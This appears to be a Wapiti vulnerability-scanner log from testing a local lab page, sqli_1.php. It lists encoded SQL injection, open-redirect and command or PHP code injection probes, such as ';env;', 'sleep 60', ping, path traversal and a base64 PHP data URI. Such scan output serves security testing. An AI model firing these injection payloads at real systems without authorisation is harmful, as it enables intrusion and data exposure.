2024-03-20 16:41:19.405 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
2024-03-20 16:41:26.106 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2%22%29%20AND%2038%3D137%20AND%20%28%2248%22%3D%2248
2024-03-20 16:41:26.122 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13
2024-03-20 16:41:26.122 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%C2%BF%27%22%28&bug=13
2024-03-20 16:41:26.132 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=%C2%BF%27%22%28
2024-03-20 16:41:26.152 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%20AND%2093%3D167%20AND%2042%3D42&bug=13
2024-03-20 16:41:26.163 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%27%20AND%2010%3D80%20AND%20%2759%27%3D%2759&bug=13
2024-03-20 16:41:26.175 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%22%20AND%2066%3D142%20AND%20%2296%22%3D%2296&bug=13
2024-03-20 16:41:26.187 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%29%20AND%2039%3D80%20AND%20%2856%3D56&bug=13
2024-03-20 16:41:26.199 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%27%29%20AND%2081%3D159%20AND%20%28%2727%27%3D%2727&bug=13
2024-03-20 16:41:26.211 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=%22%29%20AND%2058%3D72%20AND%20%28%2264%22%3D%2264&bug=13
2024-03-20 16:41:26.223 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%20AND%2088%3D171%20AND%2089%3D89
2024-03-20 16:41:26.235 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%20AND%2069%3D109%20AND%2069%3D69
2024-03-20 16:41:26.248 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%20AND%2018%3D18%20AND%2076%3D76
2024-03-20 16:41:26.260 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%27%20AND%2022%3D64%20AND%20%2784%27%3D%2784
2024-03-20 16:41:26.273 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%27%20AND%2028%3D84%20AND%20%2733%27%3D%2733
2024-03-20 16:41:26.285 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%27%20AND%2039%3D39%20AND%20%2754%27%3D%2754
2024-03-20 16:41:26.297 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%22%20AND%2087%3D164%20AND%20%2265%22%3D%2265
2024-03-20 16:41:26.310 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%22%20AND%2090%3D170%20AND%20%2272%22%3D%2272
2024-03-20 16:41:26.323 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%22%20AND%2019%3D19%20AND%20%2290%22%3D%2290
2024-03-20 16:41:26.336 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%29%20AND%2022%3D83%20AND%20%2852%3D52
2024-03-20 16:41:26.349 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%29%20AND%2064%3D162%20AND%20%2855%3D55
2024-03-20 16:41:26.362 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%29%20AND%2041%3D41%20AND%20%2886%3D86
2024-03-20 16:41:26.375 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%27%29%20AND%2075%3D114%20AND%20%28%2777%27%3D%2777
2024-03-20 16:41:26.390 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%27%29%20AND%2043%3D137%20AND%20%28%2762%27%3D%2762
2024-03-20 16:41:26.402 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%27%29%20AND%2054%3D54%20AND%20%28%2726%27%3D%2726
2024-03-20 16:41:26.414 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%22%29%20AND%2062%3D154%20AND%20%28%2227%22%3D%2227
2024-03-20 16:41:26.425 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%22%29%20AND%2073%3D109%20AND%20%28%2288%22%3D%2288
2024-03-20 16:41:26.436 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_1.php (1)
	data: form_bug=&bug=13%22%29%20AND%2044%3D44%20AND%20%28%2223%22%3D%2223
2024-03-20 16:41:26.473 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-20 16:41:26.550 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
2024-03-20 16:41:26.566 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
2024-03-20 16:41:26.566 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_1.php?title=https%3A%2F%2Fopenbugbounty.org%2F&action=search
2024-03-20 16:41:26.610 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_1.php?title=%2F%2Fopenbugbounty.org%2F&action=search
2024-03-20 16:41:26.654 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_1.php?title=fuzz&action=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-20 16:41:26.696 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_1.php?title=fuzz&action=%2F%2Fopenbugbounty.org%2F
2024-03-20 16:41:26.756 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=default&action=search (1)
2024-03-20 16:41:26.757 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_1.php?title=default&action=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-20 16:41:26.804 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_1.php?title=default&action=%2F%2Fopenbugbounty.org%2F
2024-03-20 16:41:26.865 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php (1)
2024-03-20 16:41:26.890 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-20 16:41:26.906 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=fuzz&action=search (0)
2024-03-20 16:41:26.909 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%3Benv%3B&action=search (0)
2024-03-20 16:41:26.926 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%7Cenv%7C&action=search (0)
2024-03-20 16:41:26.943 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%3Benv%3B&action=search (0)
2024-03-20 16:41:26.959 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%3Benv%3B&action=search (0)
2024-03-20 16:41:26.975 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&action=search (0)
2024-03-20 16:41:26.991 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz%3Benv%3B&action=search (0)
2024-03-20 16:41:27.007 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz%0Aenv%3B&action=search (0)
2024-03-20 16:41:27.021 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%26set%26&action=search (0)
2024-03-20 16:41:27.031 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=set&action=search (0)
2024-03-20 16:41:27.041 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=env&action=search (0)
2024-03-20 16:41:27.052 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%2Fe%00&action=search (0)
2024-03-20 16:41:27.063 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
2024-03-20 16:41:27.072 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
2024-03-20 16:41:27.080 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
2024-03-20 16:41:27.089 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
2024-03-20 16:41:27.098 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
2024-03-20 16:41:27.106 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
2024-03-20 16:41:27.114 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
2024-03-20 16:41:27.122 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
2024-03-20 16:41:27.131 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
2024-03-20 16:41:27.143 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
2024-03-20 16:41:27.155 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
2024-03-20 16:41:27.164 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
2024-03-20 16:41:27.172 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&action=search (0)
2024-03-20 16:41:27.181 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%60%29%60&action=search (0)
2024-03-20 16:41:27.190 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%60sleep%2060%60&action=search (0)
2024-03-20 16:41:27.201 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%3Bsleep%2060%3B&action=search (0)
2024-03-20 16:41:27.211 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=a%7Csleep%2060%3B&action=search (0)
2024-03-20 16:41:27.221 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=%26ping%20-n%2025%20127.0.0.1%26&action=search (0)
2024-03-20 16:41:27.234 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%3Benv%3B (0)
2024-03-20 16:41:27.246 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%7Cenv%7C (0)
2024-03-20 16:41:27.256 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%3Benv%3B (0)
2024-03-20 16:41:27.266 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%3Benv%3B (0)
2024-03-20 16:41:27.275 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
2024-03-20 16:41:27.285 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%3Benv%3B (0)
2024-03-20 16:41:27.298 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%0Aenv%3B (0)
2024-03-20 16:41:27.314 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%26set%26 (0)
2024-03-20 16:41:27.326 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=set (0)
2024-03-20 16:41:27.336 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=env (0)
2024-03-20 16:41:27.345 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%2Fe%00 (0)
2024-03-20 16:41:27.354 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:41:27.364 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:41:27.373 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:41:27.383 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:41:27.394 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:41:27.404 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:41:27.414 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:41:27.423 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:41:27.432 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:41:27.441 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:41:27.451 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:41:27.460 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:41:27.471 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
2024-03-20 16:41:27.481 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%60%29%60 (0)
2024-03-20 16:41:27.492 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%60sleep%2060%60 (0)
2024-03-20 16:41:27.502 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%3Bsleep%2060%3B (0)
2024-03-20 16:41:27.511 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=a%7Csleep%2060%3B (0)
2024-03-20 16:41:27.521 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=fuzz&action=%26ping%20-n%2025%20127.0.0.1%26 (0)
2024-03-20 16:41:27.539 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=default&action=search (1)
2024-03-20 16:41:27.541 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%3Benv%3B (1)
2024-03-20 16:41:27.551 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%7Cenv%7C (1)
2024-03-20 16:41:27.559 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%3Benv%3B (1)
2024-03-20 16:41:27.570 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%3Benv%3B (1)
2024-03-20 16:41:27.582 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (1)
2024-03-20 16:41:27.595 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=search%3Benv%3B (1)
2024-03-20 16:41:27.605 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=search%0Aenv%3B (1)
2024-03-20 16:41:27.615 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%26set%26 (1)
2024-03-20 16:41:27.624 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=set (1)
2024-03-20 16:41:27.634 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=env (1)
2024-03-20 16:41:27.642 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%2Fe%00 (1)
2024-03-20 16:41:27.653 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:41:27.663 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:41:27.674 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:41:27.684 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:41:27.692 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:41:27.702 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:41:27.714 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:41:27.724 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:41:27.735 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:41:27.745 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:41:27.756 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:41:27.766 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:41:27.775 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (1)
2024-03-20 16:41:27.786 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%60%29%60 (1)
2024-03-20 16:41:27.797 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%60sleep%2060%60 (1)
2024-03-20 16:41:27.806 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%3Bsleep%2060%3B (1)
2024-03-20 16:41:27.816 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%7Csleep%2060%3B (1)
2024-03-20 16:41:27.829 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%26ping%20-n%2025%20127.0.0.1%26 (1)
2024-03-20 16:41:27.848 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php (1)
2024-03-20 16:41:27.860 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_1.php (1)
	data: form_security_level=submit&security_level=2
2024-03-20 16:41:27.863 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=%3Benv%3B&security_level=2
2024-03-20 16:41:27.870 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=%7Cenv%7C&security_level=2
2024-03-20 16:41:27.877 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=a%3Benv%3B&security_level=2
2024-03-20 16:41:27.885 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=a%3Benv%3B&security_level=2
2024-03-20 16:41:27.893 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&security_level=2
2024-03-20 16:41:27.900 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit%3Benv%3B&security_level=2
2024-03-20 16:41:27.906 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=submit%0Aenv%3B&security_level=2
2024-03-20 16:41:27.912 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
	data: form_security_level=%26set%26&security_level=2
